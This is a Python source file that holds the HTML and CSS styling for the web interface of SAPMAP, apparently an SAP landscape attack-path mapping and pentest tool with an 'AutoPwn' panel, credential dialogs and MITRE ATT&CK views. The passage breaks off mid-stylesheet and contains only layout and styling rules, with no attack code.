#!/usr/bin/env python3
"""
SAPMAP HTML Frontend — Single-page app with interactive SVG landscape map.

Generates the complete HTML/CSS/JavaScript for the SAPMAP GUI.
Features:
  - Interactive SVG map with pan/zoom/drag
  - System boxes with SAPology pill icons
  - RFC connection lines with hover info
  - Right-click context menus
  - Connection info panels
  - Credential dialogs
  - Real-time console
  - Status bar
"""


def get_html() -> str:
    """Return the complete HTML for the SAPMAP single-page application."""
    return _HTML


_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>SAPMAP — SAP Landscape Attack Path Mapper</title>
<link rel="icon" type="image/x-icon" href="/favicon.ico">
<style>
/* === Reset & Base === */
*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
html, body { height: 100%; overflow: hidden; }

/* Read-only mode: hide every destructive control from the UI.
   Class is toggled on <body> by initMode() after polling /api/mode.
   Backend still enforces via a 403 hook, this is the UX layer. */
body.read-only .write-op { display: none !important; }
body {
  font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
  background: #0d1117; color: #e6edf3; font-size: 13px;
  display: flex; flex-direction: column;
}

/* === Menu Bar === */
.menu-bar {
  display: flex; align-items: center; gap: 2px;
  background: #161b22; border-bottom: 1px solid #30363d;
  padding: 2px 8px; height: 28px; flex-shrink: 0;
}
.menu-bar .logo { font-weight: 700; color: #f0883e; margin-right: 12px; font-size: 13px; }
.menu-item {
  position: relative; padding: 3px 10px; cursor: pointer;
  border-radius: 4px; color: #c9d1d9; font-size: 12px;
}
.menu-item:hover { background: #30363d; }
.menu-dropdown {
  display: none; position: absolute; left: 0; top: 100%;
  background: #1c2128; border: 1px solid #30363d; border-radius: 6px;
  min-width: 220px; padding: 4px 0; z-index: 1000; box-shadow: 0 8px 24px rgba(0,0,0,.4);
  /* The Actions menu grew past the viewport on short screens (macOS
     browser window ~800px tall) so entries at the bottom were
     unreachable.  Cap the height at 85% of the viewport and let the
     dropdown scroll internally. */
  max-height: 85vh; overflow-y: auto; overflow-x: hidden;
  /* Firefox scrollbar styling — Chromium uses the ::-webkit rule below. */
  scrollbar-width: thin; scrollbar-color: #30363d #1c2128;
}
.menu-dropdown::-webkit-scrollbar { width: 8px; }
.menu-dropdown::-webkit-scrollbar-track { background: #1c2128; }
.menu-dropdown::-webkit-scrollbar-thumb {
  background: #30363d; border-radius: 4px;
}
.menu-dropdown::-webkit-scrollbar-thumb:hover { background: #484f58; }
.menu-item:hover .menu-dropdown { display: block; }
.menu-dropdown .dd-item {
  padding: 6px 16px; cursor: pointer; display: flex; align-items: center; gap: 8px;
  font-size: 12px; color: #c9d1d9;
}
.menu-dropdown .dd-item:hover { background: #30363d; }
.menu-dropdown .dd-sep { border-top: 1px solid #30363d; margin: 4px 0; }
/* Issue #2 (item 5) — subheader rows inside long dropdowns so the
   Actions menu stops reading as an undifferentiated wall of items. */
.menu-dropdown .dd-header {
  padding: 8px 16px 3px 12px;
  font-size: 10px; letter-spacing: 0.5px;
  text-transform: uppercase; color: #6e7681;
  font-weight: 600; cursor: default; user-select: none;
}
/* Empty-canvas welcome card — dismissable "getting started" hint
   shown only when the landscape is empty AND the user hasn't
   dismissed it before (localStorage). */
#welcome-card {
  position: absolute; top: 50%; left: 50%;
  transform: translate(-50%, -50%);
  max-width: 460px; max-height: calc(100% - 40px);
  overflow-y: auto; padding: 14px 18px;
  background: #161b22; border: 1px solid #30363d; border-radius: 8px;
  color: #c9d1d9; font-size: 12px; line-height: 1.55;
  box-shadow: 0 4px 16px rgba(0,0,0,.35);
  display: none; z-index: 5;
}
#welcome-card h4 {
  color: #58a6ff; font-size: 13px; margin: 0 0 8px 0;
}
#welcome-card ol { margin: 6px 0 6px 18px; padding: 0; }
#welcome-card li { margin: 3px 0; }
#welcome-card .welcome-dismiss {
  position: absolute; top: 6px; right: 10px;
  cursor: pointer; color: #6e7681; font-size: 16px;
}
#welcome-card .welcome-dismiss:hover { color: #c9d1d9; }

/* === Toolbar === */
.toolbar {
  display: flex; align-items: center; gap: 6px;
  background: #161b22; border-bottom: 1px solid #30363d;
  padding: 6px 12px; flex-shrink: 0;
}
.toolbar label { color: #8b949e; font-size: 11px; }
.toolbar input, .toolbar select {
  background: #0d1117; border: 1px solid #30363d; color: #e6edf3;
  padding: 3px 8px; border-radius: 4px; font-size: 12px;
}
.toolbar input[type="text"] { width: 260px; }
.toolbar input[type="number"] { width: 50px; }
.btn {
  padding: 4px 12px; border: 1px solid #30363d; border-radius: 4px;
  background: #21262d; color: #c9d1d9; cursor: pointer; font-size: 12px;
  display: inline-flex; align-items: center; gap: 4px;
}
.btn:hover { background: #30363d; border-color: #8b949e; }
.btn-primary { background: #238636; border-color: #2ea043; color: #fff; }
.btn-primary:hover { background: #2ea043; }
.btn-danger { background: #da3633; border-color: #f85149; color: #fff; }
.btn-danger:hover { background: #f85149; }
.radio-group { display: flex; gap: 12px; align-items: center; }
.radio-group label { display: flex; align-items: center; gap: 4px; cursor: pointer; }

/* === Main Layout === */
.main { flex: 1; display: flex; flex-direction: column; overflow: hidden; }
.map-container {
  flex: 1; position: relative; overflow: hidden;
  background: #0d1117; border-bottom: 1px solid #30363d;
}
.map-container .empty-msg {
  position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
  color: #484f58; font-size: 14px; text-align: center;
}

/* === SVG Map === */
#map-svg { width: 100%; height: 100%; }
.node-box { cursor: grab; }
.node-box:active { cursor: grabbing; }
.node-header { cursor: grab; }
.edge-line { cursor: pointer; }
.edge-line:hover { stroke-width: 12 !important; filter: brightness(1.3); }

/* === Legend === */
/* Slim bar with a Legend button + Show-unknown-targets checkbox.  The
   full legend content lives behind a modal so it doesn't crowd the
   map — click the button to expand. */
.legend-bar {
  display: flex; align-items: center; gap: 12px; flex-wrap: wrap;
  row-gap: 4px;
  background: #161b22; border-bottom: 1px solid #30363d;
  padding: 4px 12px; font-size: 11px; color: #8b949e; flex-shrink: 0;
}
.legend-item { display: flex; align-items: center; gap: 4px; }
.legend-swatch {
  width: 14px; height: 10px; border-radius: 2px; display: inline-block;
}
.legend-sep {
  width: 1px; height: 14px; background: #30363d;
  align-self: center;
}
.legend-btn {
  display: inline-flex; align-items: center; gap: 6px;
  padding: 3px 12px; border: 1px solid #30363d; border-radius: 4px;
  background: #21262d; color: #c9d1d9; font-size: 11px;
  cursor: pointer; user-select: none;
  transition: background 0.12s, border-color 0.12s;
}
.legend-btn:hover {
  background: #30363d; border-color: #484f58; color: #f0883e;
}
.legend-btn .caret { color: #6e7681; font-size: 9px; }

/* Full legend modal — wider than the standard credential modals since
   it lists 20+ edge/node types side-by-side.  Grid layout groups items
   under section headings. */
.legend-modal { width: 720px; max-width: 92vw; }
.legend-modal h3 {
  display: flex; justify-content: space-between; align-items: center;
  font-size: 15px; margin-bottom: 12px;
}
.legend-modal .close-x {
  background: transparent; border: none; color: #8b949e;
  cursor: pointer; font-size: 20px; line-height: 1; padding: 0 6px;
}
.legend-modal .close-x:hover { color: #f85149; }
.legend-section {
  margin-bottom: 14px;
  border-top: 1px solid #21262d; padding-top: 10px;
}
.legend-section:first-of-type { border-top: none; padding-top: 0; }
.legend-section h4 {
  font-size: 11px; text-transform: uppercase; letter-spacing: 0.5px;
  color: #58a6ff; margin: 0 0 8px 0;
}
.legend-grid {
  display: grid; grid-template-columns: repeat(2, 1fr);
  gap: 6px 20px; font-size: 12px; color: #c9d1d9;
}
.legend-row {
  display: flex; align-items: center; gap: 10px;
  padding: 3px 0;
}
.legend-row .swatch-cell {
  flex: 0 0 40px; display: flex; align-items: center;
  justify-content: center;
}
.legend-row .label {
  flex: 1; font-size: 11px; color: #c9d1d9; line-height: 1.3;
}
.legend-row .hint {
  color: #8b949e; font-size: 10px; margin-top: 2px;
}

/* === Console === */
.console-resizer {
  height: 8px; flex-shrink: 0; cursor: ns-resize;
  background: #21262d; border-top: 1px solid #30363d; border-bottom: 1px solid #30363d;
  transition: background 0.15s;
  position: relative; z-index: 10;
  display: flex; align-items: center; justify-content: center;
}
.console-resizer::before {
  content: ''; display: block;
  width: 40px; height: 2px; border-radius: 2px;
  background: #484f58;
}
.console-resizer:hover, .console-resizer.dragging { background: #1f6feb; }
.console-resizer:hover::before, .console-resizer.dragging::before { background: #c9d1d9; }
.console-container {
  height: 180px; flex-shrink: 0; display: flex; flex-direction: column;
  min-height: 0;
}
.console-header {
  display: flex; justify-content: space-between; align-items: center;
  background: #161b22; padding: 2px 12px; font-size: 11px; color: #8b949e;
  border-bottom: 1px solid #30363d;
}
.console-body {
  flex: 1; overflow-y: auto; padding: 4px 12px;
  font-family: 'Cascadia Code', 'Fira Code', 'Consolas', monospace;
  font-size: 11px; background: #0d1117; line-height: 1.5;
  user-select: text; -webkit-user-select: text; cursor: text;
}
.cl-ok { color: #3fb950; }
.cl-err { color: #f85149; }
.cl-warn { color: #d29922; }
.cl-info { color: #8b949e; }
.cl-dim { color: #484f58; }
.cl-crit { color: #f85149; font-weight: bold; }

/* === AutoPwn === */
/* Progress panel — docked to right side, map stays visible + interactive */
.autopwn-panel {
  display: none; position: fixed; top: 60px; right: 0; bottom: 0;
  width: 420px; max-width: 45vw; z-index: 2500;
  background: #1c2128; border-left: 2px solid #f85149;
  box-shadow: -4px 0 20px rgba(0,0,0,.5);
  flex-direction: column; overflow: hidden;
}
.autopwn-panel.visible { display: flex; }
.autopwn-panel-body {
  flex: 1; overflow-y: auto; padding: 16px;
  scrollbar-width: thin; scrollbar-color: #484f58 #1c2128;
}
.autopwn-panel-body::-webkit-scrollbar { width: 8px; }
.autopwn-panel-body::-webkit-scrollbar-track { background: #1c2128; }
.autopwn-panel-body::-webkit-scrollbar-thumb { background: #484f58; border-radius: 4px; }
.autopwn-phases { display: flex; align-items: center; gap: 4px; margin: 12px 0; flex-wrap: wrap; }
.autopwn-phase {
  display: flex; flex-direction: column; align-items: center;
  padding: 6px 8px; border-radius: 6px; border: 1px solid #30363d;
  background: #161b22; min-width: 48px; font-size: 10px; color: #8b949e;
  transition: all .3s;
}
.autopwn-phase.active { border-color: #58a6ff; color: #58a6ff; background: #0d1926; }
.autopwn-phase.done { border-color: #3fb950; color: #3fb950; }
.autopwn-phase.skipped { opacity: .35; }
.autopwn-phase-icon { font-size: 14px; margin-bottom: 2px; }
.autopwn-phase-label { font-weight: 600; white-space: nowrap; font-size: 9px; }
.autopwn-phase-sub { font-size: 9px; color: #484f58; margin-top: 1px; }
.autopwn-arrow { color: #30363d; font-size: 12px; }
.autopwn-stats {
  display: flex; gap: 8px; margin: 10px 0; padding: 8px 10px;
  background: #161b22; border: 1px solid #30363d; border-radius: 6px;
}
.autopwn-stat { text-align: center; flex: 1; }
.autopwn-stat-val { font-size: 16px; font-weight: 700; color: #e6edf3; }
.autopwn-stat-label { font-size: 9px; color: #8b949e; text-transform: uppercase; }
.autopwn-bar-track {
  height: 6px; background: #21262d; border-radius: 3px; margin: 8px 0; overflow: hidden;
}
.autopwn-bar-fill {
  height: 100%; background: linear-gradient(90deg, #f85149, #f0883e); border-radius: 3px;
  transition: width .5s ease;
}
.autopwn-log {
  background: #010409; border: 1px solid #30363d; border-radius: 6px;
  padding: 8px; font-family: 'SFMono-Regular',Consolas,monospace;
  font-size: 11px; line-height: 1.6; overflow-y: auto; flex: 1; min-height: 120px;
  user-select: text; -webkit-user-select: text; cursor: text;
  scrollbar-width: thin; scrollbar-color: #484f58 #010409;
}
.autopwn-log::-webkit-scrollbar { width: 6px; }
.autopwn-log::-webkit-scrollbar-track { background: #010409; }
.autopwn-log::-webkit-scrollbar-thumb { background: #484f58; border-radius: 3px; }
.autopwn-log .wave-hdr { color: #f0883e; font-weight: bold; margin: 6px 0 2px; }
.autopwn-log .phase-hdr { color: #58a6ff; font-weight: 600; }
.autopwn-cb { display: flex; align-items: center; gap: 6px; font-size: 12px; color: #c9d1d9; margin: 3px 0; cursor: pointer; }
.autopwn-cb input[type=checkbox] { accent-color: #f85149; }

/* === Status Bar === */
.status-bar {
  display: flex; align-items: center; gap: 16px;
  background: #161b22; border-top: 1px solid #30363d;
  padding: 2px 12px; font-size: 11px; color: #8b949e; flex-shrink: 0;
}
.status-bar .stat { display: flex; align-items: center; gap: 4px; }
.status-bar .stat-val { color: #e6edf3; font-weight: 600; }

/* === Context Menu === */
.ctx-menu {
  display: none; position: fixed; z-index: 2000;
  background: #1c2128; border: 1px solid #30363d; border-radius: 8px;
  min-width: 260px; padding: 4px 0; box-shadow: 0 8px 24px rgba(0,0,0,.5);
}
.ctx-menu.visible { display: block; }
.ctx-item {
  padding: 7px 16px; cursor: pointer; display: flex; align-items: center; gap: 8px;
  font-size: 12px; color: #c9d1d9; position: relative; white-space: nowrap;
}
.ctx-item:hover { background: #30363d; }
.ctx-item.disabled { color: #484f58; cursor: default; }
.ctx-item.disabled:hover { background: transparent; }
.ctx-sep { border-top: 1px solid #30363d; margin: 4px 0; }

/* Flyout submenu groups */
.ctx-group { position: relative; }
.ctx-group > .ctx-item::after {
  content: '\25B8'; margin-left: auto; font-size: 10px; color: #8b949e;
}
.ctx-sub {
  display: none; position: absolute; left: 100%; top: -4px;
  background: #1c2128; border: 1px solid #30363d; border-radius: 8px;
  min-width: 260px; padding: 4px 0; box-shadow: 0 8px 24px rgba(0,0,0,.5);
  z-index: 2100;
  /* JS (_reflowSubmenus) sets an inline max-height based on the
     submenu's actual position — this CSS fallback catches the edge
     case where JS hasn't run yet (e.g. SCC/BTP menus). */
  max-height: 80vh; overflow-y: auto;
}
.ctx-group:hover > .ctx-sub { display: block; }
/* Flip submenu left if it would overflow viewport (set by JS) */
.ctx-sub.flip-left { left: auto; right: 100%; }
/* Flip submenu up — anchor its bottom to the parent row's bottom —
   when opening downward would overflow the viewport (set by JS in
   showCtxMenu / showSCCCtxMenu / showBTPCtxMenu). */
.ctx-sub.flip-up { top: auto; bottom: -4px; }

/* Scroll affordance — shown by _attachScrollHints when the submenu's
   content exceeds the viewport-capped max-height.  Two indicators
   (▲ at top, ▼ at bottom) overlay the visible scroll viewport and
   fade out based on scroll position.

   When overflow is detected the JS wraps items in an inner
   .ctx-sub-scroll (which IS the scroll container) and turns
   .ctx-sub itself into a pure positioning context (overflow:visible).
   That way the absolute chevrons are positioned relative to the
   visible viewport-clipped box, not the scrollable content area. */
.ctx-sub-scroll { overflow-y: auto; }
.ctx-sub .ctx-scroll-hint {
  position: absolute;
  left: 0; right: 0;
  height: 22px;
  pointer-events: none;
  display: flex; align-items: center; justify-content: center;
  font-size: 11px; font-weight: 700; color: #f0883e;
  letter-spacing: 1px;
  z-index: 2200;
  transition: opacity .15s;
}
.ctx-sub .ctx-scroll-hint.top {
  top: 0;
  background: linear-gradient(180deg, #1c2128 65%, rgba(28,33,40,0) 100%);
  border-radius: 8px 8px 0 0;
}
.ctx-sub .ctx-scroll-hint.bottom {
  bottom: 0;
  background: linear-gradient(0deg, #1c2128 65%, rgba(28,33,40,0) 100%);
  border-radius: 0 0 8px 8px;
}
/* When at the corresponding edge, hide the matching hint. */
.ctx-sub.at-top    .ctx-scroll-hint.top    { opacity: 0; }
.ctx-sub.at-bottom .ctx-scroll-hint.bottom { opacity: 0; }
/* When content fits without scrolling, hide both. */
.ctx-sub:not(.has-overflow) .ctx-scroll-hint { display: none; }

/* Custom fast tooltip for context menu items — native title= has ~1s
   delay which is too slow for flyout submenus that close on mouseout. */
.ctx-tooltip {
  position: fixed; z-index: 9999; pointer-events: none;
  background: #0d1117; border: 1px solid #58a6ff; border-radius: 6px;
  padding: 8px 12px; max-width: 380px; font-size: 11.5px;
  color: #c9d1d9; line-height: 1.45; white-space: normal;
  box-shadow: 0 4px 16px rgba(0,0,0,.6);
  opacity: 0; transition: opacity .12s;
}
.ctx-tooltip.visible { opacity: 1; }

/* === Info Panel (connection details) === */
.info-panel {
  display: none; position: fixed; z-index: 1500;
  background: #1c2128; border: 1px solid #30363d; border-radius: 8px;
  width: 420px; max-height: 500px; overflow-y: auto; padding: 16px;
  box-shadow: 0 8px 24px rgba(0,0,0,.5);
  /* Everything inside the panel is selectable so the operator can
     copy IPs, usernames, passwords, etc. */
  user-select: text; -webkit-user-select: text; cursor: text;
}
.info-panel.visible { display: block; }
.info-panel h3 { font-size: 13px; color: #f0883e; margin-bottom: 10px; }
.info-panel .info-row { display: flex; margin: 3px 0; font-size: 12px; }
.info-panel .info-label { color: #8b949e; width: 110px; flex-shrink: 0; }
.info-panel .info-val { color: #e6edf3; word-break: break-all; }
.info-panel .info-section { margin-top: 8px; padding-top: 8px; border-top: 1px solid #30363d; }
.info-panel .profile-list { margin: 4px 0 0 8px; }
.info-panel .profile-item { font-size: 11px; color: #c9d1d9; padding: 1px 0; }
.info-panel .profile-item.sap-all { color: #f85149; font-weight: bold; }
.info-panel .risk-badge {
  display: inline-block; padding: 2px 8px; border-radius: 3px;
  font-size: 11px; font-weight: 600;
}
.risk-critical { background: #da3633; color: #fff; }
.risk-high { background: #e67e22; color: #fff; }
.risk-medium { background: #d29922; color: #fff; }
.risk-low { background: #3498db; color: #fff; }
.risk-unknown { background: #484f58; color: #fff; }

/* === Modal === */
.modal-overlay {
  display: none; position: fixed; inset: 0; z-index: 3000;
  background: rgba(0,0,0,.6); align-items: center; justify-content: center;
}
.modal-overlay.visible { display: flex; }
.modal {
  background: #1c2128; border: 1px solid #30363d; border-radius: 10px;
  width: 440px; padding: 20px; box-shadow: 0 12px 40px rgba(0,0,0,.5);
  /* Scroll when content overflows viewport (e.g. BTP enumerate result
     panel can grow several thousand pixels on landscapes with many
     CF service instances). */
  max-height: 90vh; overflow-y: auto;
  /* Slim scrollbar so the modal still looks tidy when scrolling. */
  scrollbar-width: thin; scrollbar-color: #484f58 #1c2128;
}
.modal::-webkit-scrollbar { width: 8px; }
.modal::-webkit-scrollbar-track { background: #1c2128; }
.modal::-webkit-scrollbar-thumb { background: #484f58; border-radius: 4px; }
/* Draggable + resizable variant — used by the ATT&CK coverage modal
   so the operator can reposition it to reveal map nodes underneath
   and resize when the grid grows tall.  position:fixed pops it out
   of the flex-centered overlay flow; the JS drag handler updates
   top/left on the .modal element directly. */
.modal.modal-draggable {
  position: fixed;
  top: 6vh; left: 2vw;
  margin: 0;
  resize: both;
  min-width: 640px; min-height: 320px;
  max-width: 98vw; max-height: 94vh;
  overflow: hidden;   /* inner scrollable body handles overflow */
}
.modal.modal-draggable > .modal-body {
  overflow: auto; flex: 1;
}
.modal .modal-drag-handle { cursor: move; user-select: none; }
.modal-overlay.overlay-transparent {
  background: transparent;
  /* Let clicks reach the map when the modal is dragged aside; only
     the modal itself remains interactive. */
  pointer-events: none;
}
.modal-overlay.overlay-transparent .modal { pointer-events: auto; }
.modal h3 { font-size: 14px; color: #f0883e; margin-bottom: 16px; }
.modal .form-row { margin-bottom: 10px; }
.modal .form-row label { display: block; font-size: 11px; color: #8b949e; margin-bottom: 3px; }
.modal .form-row input, .modal .form-row select {
  width: 100%; padding: 6px 10px; background: #0d1117; border: 1px solid #30363d;
  color: #e6edf3; border-radius: 4px; font-size: 12px;
  -webkit-appearance: none; appearance: none;
}
.modal .form-row select { background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%238b949e' d='M2 4l4 4 4-4'/%3E%3C/svg%3E"); background-repeat: no-repeat; background-position: right 8px center; padding-right: 28px; }
.modal .form-row select option { background: #0d1117; color: #e6edf3; }
.modal .form-actions { display: flex; gap: 8px; justify-content: flex-end; margin-top: 16px; }

/* === Pill Badges (system type) === */
.pill {
  display: inline-block; padding: 1px 8px; border-radius: 10px;
  font-size: 9px; font-weight: 700; color: #fff; vertical-align: middle;
}

/* === System Detail Panel === */
.detail-panel {
  display: none; position: fixed; right: 0; top: 28px; bottom: 24px;
  width: 360px; background: #1c2128; border-left: 1px solid #30363d;
  z-index: 1000; overflow-y: auto; padding: 16px;
  user-select: text; -webkit-user-select: text; cursor: auto;
}
.detail-panel.visible { display: block; }
.detail-panel h3 { font-size: 14px; color: #f0883e; margin-bottom: 12px; }
.detail-panel .close-btn {
  position: absolute; top: 8px; right: 12px; cursor: pointer;
  color: #8b949e; font-size: 16px;
}
.detail-panel .close-btn:hover { color: #e6edf3; }
.detail-section { margin-bottom: 12px; }
.detail-section h4 { font-size: 12px; color: #8b949e; margin-bottom: 6px; }
.detail-row { display: flex; font-size: 12px; padding: 2px 0; }
.detail-key { color: #8b949e; width: 100px; flex-shrink: 0; }
.detail-val { color: #e6edf3; word-break: break-all; }
.finding-item {
  padding: 4px 8px; margin: 2px 0; border-radius: 4px;
  font-size: 11px; border-left: 3px solid;
}
.finding-critical { border-color: #da3633; background: rgba(218,54,51,.1); }
.finding-high { border-color: #e67e22; background: rgba(230,126,34,.1); }
.finding-medium { border-color: #d29922; background: rgba(210,153,34,.1); }
.finding-low { border-color: #3498db; background: rgba(52,152,219,.1); }
.finding-info { border-color: #8b949e; background: rgba(139,148,158,.1); }

/* Activity indicator */
@keyframes spin { to { transform: rotate(360deg); } }
@keyframes pulse { 0%,100% { opacity:.6; } 50% { opacity:1; } }
@keyframes activity-glow {
  0%,100% { box-shadow: inset 0 0 0 1px #f0883e70, 0 0 14px #f0883e40; }
  50%     { box-shadow: inset 0 0 0 1px #f0883e, 0 0 22px #f0883e90; }
}
.activity-dot {
  display: inline-block; width: 12px; height: 12px; border-radius: 50%;
  background: #f0883e; margin-right: 10px;
  animation: pulse 1.2s ease-in-out infinite;
  box-shadow: 0 0 8px #f0883ecc;
}
#activity-bar {
  display: none; align-items: center; gap: 6px;
  background: linear-gradient(90deg, #2a1a08 0%, #1a1510 100%);
  border-bottom: 2px solid #f0883e;
  padding: 8px 16px; flex-shrink: 0;
  font-size: 15px; font-weight: 600; letter-spacing: 0.3px;
  color: #ffb27a; text-shadow: 0 0 6px #f0883e80;
  animation: activity-glow 2s ease-in-out infinite;
}
#activity-bar.active { display: flex; }
#activity-prefix {
  font-weight: 700; color: #f0883e; margin-right: 8px;
  text-transform: uppercase; font-size: 12px; letter-spacing: 1px;
  padding: 2px 8px; border: 1px solid #f0883e80; border-radius: 3px;
  background: #f0883e15;
}
/* Critical-finding banner: fixed bottom-right toast stack so it doesn't
 * pile up with the activity-bar at the top.  Newest slides in from the
 * right and sits at the bottom; older toasts stack upward. */
#findings-bar {
  position: fixed; right: 16px; z-index: 900;
  bottom: 200px; /* JS updates this to sit just above the console pane */
  width: 420px; max-width: calc(100vw - 32px);
  display: flex; flex-direction: column; gap: 8px;
  pointer-events: none;
  transition: bottom 0.12s ease-out;
}
.finding-row {
  display: flex; align-items: center; gap: 10px;
  padding: 8px 12px; font-size: 13px; font-weight: 600;
  border-radius: 6px; border-left: 4px solid currentColor;
  box-shadow: 0 4px 18px #000a, 0 0 0 1px #30363d80;
  backdrop-filter: blur(2px);
  pointer-events: auto;
  animation: finding-slide 0.28s ease-out;
}
@keyframes finding-slide {
  from { transform: translateX(24px); opacity: 0; }
  to   { transform: translateX(0);    opacity: 1; }
}
.finding-row.sev-CRITICAL {
  background: linear-gradient(90deg, #4a1a1a 0%, #2a1010 100%);
  color: #ff8a80;
  border-bottom-color: #8b0000;
  box-shadow: inset 0 0 0 1px #8b000080, 0 0 16px #8b000050;
}
.finding-row.sev-HIGH {
  background: linear-gradient(90deg, #3a2410 0%, #1f1810 100%);
  color: #ffb27a;
  border-bottom-color: #f0883e;
  box-shadow: inset 0 0 0 1px #f0883e60;
}
.finding-row.sev-MEDIUM {
  background: linear-gradient(90deg, #3a3410 0%, #1f1c10 100%);
  color: #e6d884;
  border-bottom-color: #d29922;
}
.finding-row.sev-INFO {
  background: linear-gradient(90deg, #10283a 0%, #101820 100%);
  color: #8bd2ff;
  border-bottom-color: #388bfd;
}
.finding-sev {
  font-weight: 800; font-size: 10px; letter-spacing: 1px;
  padding: 2px 7px; border: 1px solid currentColor; border-radius: 3px;
  flex-shrink: 0; text-transform: uppercase;
}
.finding-node {
  font-weight: 700; cursor: pointer; text-decoration: underline;
  text-decoration-color: currentColor; text-underline-offset: 3px;
  flex-shrink: 0;
}
.finding-node:hover { filter: brightness(1.3); }
.finding-msg { flex: 1; font-weight: 500; }
.finding-cve {
  flex-shrink: 0; font-size: 11px; opacity: 0.8;
  padding: 1px 6px; border: 1px solid currentColor; border-radius: 2px;
}
/* MITRE ATT&CK technique pills.  Used next to each finding (CVE row
   in the drawer, finding-item in the per-node panel) and inside the
   ATT&CK observed section in the node detail panel. */
.attack-pills { display: inline-flex; gap: 3px; flex-wrap: wrap; vertical-align: middle; }
.attack-pill {
  display: inline-block; font-family: monospace; font-size: 10px;
  padding: 1px 5px; border-radius: 2px;
  background: #1f2937; color: #93c5fd; border: 1px solid #374151;
  text-decoration: none; cursor: pointer; line-height: 14px;
}
.attack-pill:hover { background: #2563eb; color: #fff; border-color: #2563eb; }
/* Remediation badges next to the fix summary (restart needed / online,
   effort estimate, severity if delayed).  Same shape language as the
   ATT&CK pills but in muted grey so they don't fight the green block. */
/* Suggested actions (context menu guidance) */
.ctx-suggested { padding: 4px 0; border-bottom: 1px solid #30363d; }
.ctx-suggested-hdr { padding: 2px 12px; font-size: 9px; color: #8b949e; text-transform: uppercase; letter-spacing: 1px; pointer-events: none; }
.ctx-suggest-item {
  padding: 5px 12px; cursor: pointer; display: flex; align-items: center; gap: 6px;
  font-size: 12px; color: #58a6ff; font-weight: 600; white-space: nowrap;
}
.ctx-suggest-item:hover { background: #1a3a5c; }
.ctx-item.ctx-highlighted {
  color: #58a6ff; font-weight: 600;
  background: rgba(88, 166, 255, 0.12);
  box-shadow: inset 0 0 0 1px rgba(88, 166, 255, 0.5);
  border-radius: 3px;
}
.ctx-item.ctx-highlighted:hover { background: rgba(88, 166, 255, 0.22); }
/* Inline action buttons in details panel */
.detail-action-btn {
  display: inline-block; font-size: 10px; color: #58a6ff; cursor: pointer;
  margin-left: 8px; text-decoration: underline; text-underline-offset: 2px;
}
.detail-action-btn:hover { color: #79c0ff; }
/* Phase-progress indicator (top of details panel) */
.phase-progress {
  display: flex; align-items: flex-start; justify-content: space-between;
  padding: 8px 6px; margin: 6px 0 12px 0;
  background: #0d1117; border: 1px solid #21262d; border-radius: 6px;
  font-size: 9px; box-sizing: border-box; width: 100%;
  overflow: hidden;
}
.phase-step {
  display: flex; flex-direction: column; align-items: center; gap: 3px;
  flex: 0 0 auto; text-align: center; min-width: 0;
}
.phase-dot {
  width: 12px; height: 12px; border-radius: 50%;
  border: 2px solid #30363d; background: transparent;
  display: flex; align-items: center; justify-content: center;
  font-size: 8px; color: transparent; flex-shrink: 0;
}
.phase-step.done .phase-dot { background: #238636; border-color: #238636; color: #fff; }
.phase-step.done .phase-dot::before { content: '\2713'; color: #fff; font-size: 8px; font-weight: bold; }
.phase-step.active .phase-dot {
  border-color: #58a6ff; background: rgba(88,166,255,0.15);
  box-shadow: 0 0 0 2px rgba(88,166,255,0.25);
}
.phase-step.active .phase-label { color: #58a6ff; font-weight: 600; }
.phase-label { color: #8b949e; letter-spacing: 0.2px; text-transform: uppercase; white-space: nowrap; }
.phase-step.done .phase-label { color: #3fb950; }
.phase-connector {
  flex: 1 1 auto; height: 2px; background: #30363d; margin: 0 3px;
  margin-top: 7px; min-width: 6px;
}
.phase-connector.done { background: #238636; }
/* Next-step links in finding toasts */
.finding-action {
  flex-shrink: 0; font-size: 10px; cursor: pointer;
  padding: 2px 8px; border: 1px solid currentColor; border-radius: 3px;
  text-decoration: none; opacity: 0.9;
}
.finding-action:hover { opacity: 1; filter: brightness(1.2); }
.rem-badge {
  display: inline-block; font-family: monospace; font-size: 10px;
  padding: 1px 6px; border-radius: 2px;
  background: #1c2128; color: #cfd9df; border: 1px solid #30363d;
  line-height: 14px;
}
.attack-pill-more {
  background: #161b22; color: #8b949e; border-color: #30363d; cursor: help;
}
/* Heatmap modal — width tuned to fit all 11 ATT&CK tactic columns on
   one row on a typical 1440-wide laptop screen.  Column min-width
   dropped to 100px so a 14-tactic future state still fits. */
.attack-heatmap-grid {
  display: grid; gap: 4px;
  grid-template-columns: repeat(auto-fit, minmax(100px, 1fr));
  font-family: -apple-system, system-ui, sans-serif;
}
.attack-heatmap-col {
  background: #0d1117; border: 1px solid #21262d; border-radius: 4px;
  padding: 4px; min-width: 100px;
}
.attack-heatmap-col h5 {
  margin: 0 0 4px 0; font-size: 10px; color: #8b949e;
  text-transform: uppercase; letter-spacing: 0.5px;
  border-bottom: 1px solid #21262d; padding-bottom: 3px;
}
.attack-cell {
  display: block; padding: 3px 5px; margin: 2px 0;
  border-radius: 2px; font-family: monospace; font-size: 10px;
  background: #161b22; color: #6e7681;
  border: 1px solid #21262d;
  text-decoration: none; cursor: default;
}
.attack-cell.s0 { background: #161b22; color: #484f58; border-color: #21262d; }
.attack-cell.s1 { background: #3a1a14; color: #fcae91; border-color: #5a2a1f; }
.attack-cell.s2 { background: #4a1d12; color: #fc8d59; border-color: #6f2b1c; cursor: pointer; }
.attack-cell.s3 { background: #5e1a0e; color: #fb6a4a; border-color: #872b15; cursor: pointer; }
.attack-cell.s4 { background: #7a1208; color: #de2d26; border-color: #a82010; cursor: pointer; }
.attack-cell.s5 { background: #a50f15; color: #fff; border-color: #cf1820; cursor: pointer; font-weight: bold; }
.attack-cell-sub { padding-left: 12px; font-size: 9.5px; opacity: 0.9; }
.attack-cell:hover.s2, .attack-cell:hover.s3, .attack-cell:hover.s4, .attack-cell:hover.s5 {
  filter: brightness(1.25);
}
.finding-dismiss {
  cursor: pointer; opacity: 0.6; padding: 2px 6px;
  font-size: 14px; user-select: none;
}
.finding-dismiss:hover { opacity: 1; }
.finding-more {
